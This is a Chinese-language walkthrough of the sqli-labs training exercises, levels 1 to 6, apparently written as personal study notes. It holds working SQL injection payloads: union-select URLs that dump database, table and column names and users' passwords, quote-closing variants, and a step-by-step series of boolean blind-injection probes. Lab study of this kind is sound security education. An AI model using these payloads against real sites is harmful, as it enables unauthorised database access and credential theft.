# SQLI

## 第一关

上来就是一课，注意数值查询注入和字符注入。

1. 过语句and 1=2测试 ，页面回显正常，所以该地方不是数值查询
2. 接着尝试在id后面加上'，发现页面回显不正常，表示可能存在SQL字符注入
3. 输入--+将sql后面的语句注视掉后，发现页面回显正常，则证明这个地方是单引号字符型注入
    > 另外-- （这里有一个空格，--空格）在SQL内表示注释，但在URL中，如果在最后加上-- ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用--+代替-- ，原因是+在URL被URL编码后会变成空格。

4. 接着使用order by 语句判断，该表中一共有几列数据。order by 3页面回显正常，order by 4页面回显不正常，说明此表一个有3列。
5. 将id=1改为一个数据库不存在的id值，如861，使用union select 1,2,3联合查询语句查看页面是否有显示位。
    `http://192.168.3.148/Less-1/?id=1111%27%20union%20select%201,2,3%20--+`

    首先解释一下select后面几个数字的意思，1，2，3，4...，这里的几个数字纯粹是凑数的，凑够和union关键字前面的那个表的字段数一样，不然没法拼接成一个表。在sql注入的时候，在将相应位置替换成你想获得的数据，查询结果后面就会显示出来。如下图最后一行：
    ![xx](https://gss0.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/18d8bc3eb13533fad032f376a0d3fd1f40345be5.jpg)

6. 然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息例子(这是一个查询数据库名信息的语句)：  
`http://127.0.0.1/sqli-labs/Less-1/?id=861' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+`  
    > select group_concat(schema_name) from information_schema.schemata  
这个语句是查询所有数据库的名

7. 查询security内的所有表名  
`http://127.0.0.1/sqli-labs/Less-1/?id=861' union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema='security')--+`  
    > select group_concat(table_name) from information_schema.tables where table_schema='security'  
查询security内的所有表名

8. 接着使用下面的语句爆破出列名  
`select group_concat(column_name) from information_schema.columns where table_name='users'`  
9. 接着使用如下语句查询所有的用户名，密码  
`select group_concat(password) from security.users`  
`select group_concat(username) from security.users`

    > http://192.168.3.148/Less-1/?id=1111' union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)--+

## 第二关

1. `http://192.168.3.148/Less-2/?id=2-1`和`http://192.168.3.148/Less-2/?id=1`返回结果相同，因此为数形注入，`http://192.168.3.148/Less-2/?id=222222 union select 1,2,3`以这个语句进行注入，其余同第一关。

## 第三关

1. 这里考察的的闭合问题，这里是`')`这样的闭合，所以使用后面的语句进程注入即可。`http://192.168.3.148/Less-3/?id=13333') order by 3 --+`

## 第四关

1. 这里考察的也是闭合问题，这里是这种`")`,所以使用后面这样的语句来进行手工注入。`http://192.168.3.148/Less-4/?id=33333") union select 1,2,3 --+`

## 第五关

1. 这关考察布尔型盲注  
   获取数据库长度的语句 `http://192.168.3.148/Less-5/?id=1' and length(database())=10 --+`  
   依次获取数据库每个字符的语句`http://192.168.3.148/Less-5/?id=1' and ord(mid(database(),1,1))=111 --+`

    判断表存不存在  `and exists(select * from information_schema.tables)`  
    判断存在多少个库  `and (select count(distinct+table_schema) from information_schema.tables)=4`  
    查询所有数据库
    判断数据库名的长度  `and (select length(table_schema) from information_schema.tables limit 0,1) =17`  
    查询每个库的库名  `and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1),1,1)))>104`  
    查询表，先判断表的长度  `and (select length(table_name) from information_schema.tables where table_schema='information_schema' limit 0,1) >13`  
    猜解表的字符(表名)  `and (select ascii(substr((select table_name from information_schema.tables where table_schema='information_schema' limit 0,1),1,1))) >66`  
    猜解表中有多少列 `and (select count(column_name) from information_schema.columns where table_schema='information_schema' and table_name='CHARACTER_SETS' ) >4`  
    判断每个字段的长度  `and (select length(column_name) from information_schema.columns where table_schema='information_schema' and table_name='CHARACTER_SETS' limit 0,1 ) >17`  
    猜第一个字段的字符  `and (select ascii(substr((select column_name from information_schema.columns where table_schema='information_schema' and table_name='CHARACTER_SETS' limit 0,1),1,1)) ) >66`  

    查询当前数据库  
    查询数据库的长度  `and length(database()) > 4`  
    查询数据库名  `and ascii(substr((select database()),1,1)) > 99`  
    查询表名的长度  `and (select(length(table_name)) from information_schema.tables where table_schema = 0x64767761 limit 0,1) > 8+--+`  
    查询表名  `and ascii(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 1,1),1,1)) > 116`  
    查询列名的长度 `and (select(length(column_name)) from information_schema.columns where table_name = 0x7573657273 limit 0,1) > 6`  
    查询列名  `and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1,1)) > 116`  
    查询字段的长度  `and (select length(column_name) from information_schema.columns where table_name=0x7573657273 limit 1,1 ) >10`  
    爆出字段  `and ascii(substr((select user from dvwa.users limit 0,1),1,1)) > 96`

   ```txt
   这里首先列出几个常用的涵数:
    1:system_user()
    2:user()         返回MYSQL用户名
    3:current_user()
    4:session_user()
    5:database()     返回当前数据库名
    6:version()      返回当前数据库版本信息
    7:load_file()    返回文件的内容
   ```

## 第六关

1. 使用语句与第五关相同，闭合如后所示  `http://192.168.3.148/Less-6/?id=1" and length(database()) = 555 --+`

## 感谢以下博文的原作者。

> https://blog.csdn.net/sdb5858874/article/details/80727555  
https://blog.csdn.net/alex_seo/article/details/82148955